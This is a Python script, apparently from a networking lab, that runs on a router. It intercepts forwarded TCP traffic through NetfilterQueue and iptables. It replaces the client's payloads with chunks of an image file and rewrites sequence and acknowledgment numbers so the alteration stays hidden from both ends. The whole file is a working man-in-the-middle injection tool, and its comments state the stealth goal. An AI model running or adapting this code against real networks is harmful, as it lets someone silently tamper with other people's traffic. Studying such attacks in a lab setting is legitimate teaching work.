import socket
import logging
import time
import struct
from scapy.all import ARP, srp, ls, send, Ether, scapy, IP, TCP
from netfilterqueue import NetfilterQueue as NFQ
import os

index = 1
idx = 0
FIN = 0x01
SYN = 0x02
PSH = 0x08
ACK = 0x10
biggest_seq_nr = (1 << 32) - 1

# citim cate 1000 de bytes din poza de pe router si ii adaugam intr-o lista, bytes pe care o sa-i punem in payload-ul de la client alterat de router
chunks = []
with open("poza_router.png", "rb") as file:

    bytes = file.read(1000)
    while bytes:
        chunks.append(bytes)
        bytes = file.read(1000)

file.close()

client_ip = '172.10.0.2'
server_ip = '198.10.0.2'

router_dict = {}
r_router_dict = {}

server_dict = {}
r_server_dict = {}

lungime_ultim_pachet = 0


def update_maps(packet, source, destination):
    '''
    Functie care sa updateze dictionarele.
    '''
    if source == "198.10.0.2":
        if packet[TCP].ack not in router_dict.keys():
            router_dict[packet[TCP].ack] = packet[TCP].ack
            r_router_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_server_dict.keys():
            r_server_dict[packet[TCP].seq] = packet[TCP].seq
    elif source == "172.10.0.2":
        if packet[TCP].ack not in server_dict.keys():
            server_dict[packet[TCP].ack] = packet[TCP].ack
            r_server_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_router_dict.keys():
            r_router_dict[packet[TCP].seq] = packet[TCP].seq


cl = []
sv = []
def package_manipulator(packet, source, destination):
    global idx, chunks, client_ip, server_ip, lungime_ultim_pachet, cl, sv
    '''
    Functie care sa manipuleze un pachet astfel incat sa nu fie vizibil ca e modificat.
    '''
    new_payload = b''
    old_payload = b''
    if packet.haslayer(scapy.all.Raw):
        old_payload = packet[scapy.all.Raw].load
        if source == client_ip and idx < len(chunks):
            new_payload = chunks[idx]
            idx += 1
        elif source == server_ip:
            new_payload = packet[scapy.all.Raw].load

    future_seq = future_ack = 0
    print(str(idx), source, sep = " ")
    if idx >= len(chunks):
        if source == server_ip:
            if idx == len(chunks):
                sv.append(packet.seq)
                print(packet.ack)
                future_ack = (packet.ack - len(chunks[len(chunks) - 1]) + lungime_ultim_pachet) % biggest_seq_nr
                future_seq = packet.seq
                print(future_ack)
                idx += 1
            elif idx == len(chunks) + 1:
                print("---------------------------------------------------------------------------------------")
                future_ack = (packet.ack + lungime_ultim_pachet) % biggest_seq_nr
                future_seq = packet.seq
        elif source == client_ip:
            cl.append(packet.ack)
            # print(lungime_ultim_pachet)
            lungime_ultim_pachet = len(packet[scapy.all.Raw].load)
            # print(packet.seq, packet.ack, sep=" ")
            future_seq = packet.seq
            future_ack = packet.ack

    else:

        if source == "172.10.0.2":
            future_seq = r_router_dict[packet.seq]
            future_ack = server_dict[packet.ack]
        elif source == "198.10.0.2":
            future_seq = r_server_dict[packet.seq]
            future_ack = router_dict[packet.ack]
        else:
            return packet

    # print(future_ack, future_seq)
    new_packet = IP(
        src = packet[IP].src,
        dst = packet[IP].dst
    ) / TCP (
        sport = packet[TCP].sport,
        dport = packet[TCP].dport,
        seq = future_seq,
        ack = future_ack,
        flags = packet[TCP].flags
    ) / new_payload

    if idx >= len(chunks):
        return new_packet

    original_ack = (new_packet.seq + len(new_payload)) % biggest_seq_nr
    actual_ack = (packet.seq + len(old_payload)) % biggest_seq_nr

    if source == "172.10.0.2":
        router_dict[original_ack] = actual_ack
        r_router_dict[actual_ack] = original_ack
    elif source == "198.10.0.2":
        server_dict[original_ack] = actual_ack
        r_server_dict[actual_ack] = original_ack

    return new_packet

def detect_and_alter_packet(packet):
	global index

	payload = packet.get_payload()

	scapy_packet = IP(payload)

	print(" ---------- [Pachet initial] ----------")
	print("Index pachet: " + str(index))

	index += 1
	# scapy_packet.show()
	print("Tip pachet: ")
	print(scapy_packet[TCP].flags)
	print("src = " + scapy_packet[IP].src + " | dest = " + scapy_packet[IP].dst)
	print("seq_num = " + str(scapy_packet[TCP].seq) + " | ack_num = " + str(scapy_packet[TCP].ack) + '\n')

	if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP):
		if scapy_packet[TCP].flags == SYN:
			send(scapy_packet)
		elif scapy_packet[TCP].flags == (SYN | ACK):
			send(scapy_packet)
		elif scapy_packet[TCP].flags == ACK:
			send(scapy_packet)

		elif scapy_packet[TCP].flags == (ACK | PSH):
			
			if scapy_packet[IP].src == server_ip:

				update_maps(scapy_packet, scapy_packet[IP].src, scapy_packet[IP].dst)
				packet = package_manipulator(scapy_packet, scapy_packet[IP].src, scapy_packet[IP].dst)

				print(" `~~~~~~~~ [AFTER] ~~~~~~~~~~~~~~~~~~~~` ")
				print("Tip pachet: ")
				print(packet[TCP].flags)
				print("src = " + packet[IP].src + " | dest = " + packet[IP].dst)
				print("seq_num = " + str(packet[TCP].seq) + " | ack_num = " + str(packet[TCP].ack) + '\n')
				
				send(packet)
			elif scapy_packet[IP].src == client_ip:

				update_maps(scapy_packet, scapy_packet[IP].src, scapy_packet[IP].dst)
				packet = package_manipulator(scapy_packet, scapy_packet[IP].src, scapy_packet[IP].dst)

				print(" `~~~~~~~~ [AFTER] ~~~~~~~~~~~~~~~~~~~~` ")
				print("Tip pachet: ")
				print(packet[TCP].flags)
				print("src = " + packet[IP].src + " | dest = " + packet[IP].dst)
				print("seq_num = " + str(packet[TCP].seq) + " | ack_num = " + str(packet[TCP].ack) + '\n')

				send(packet)
		else:
			send(scapy_packet)

	else:
		packet.drop()
	
	print('\n')


def main():
    
    queue = NFQ()
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    queue.bind(5, detect_and_alter_packet)
    while True:
        try:
            queue.run()
        except KeyboardInterrupt:
            
            print("\nCtrl + C pressed.............Exiting")
            print("Router oprit...")
            os.system("iptables -D FORWARD 1")
            queue.unbind()
            exit()

if __name__ == "__main__":
    main()
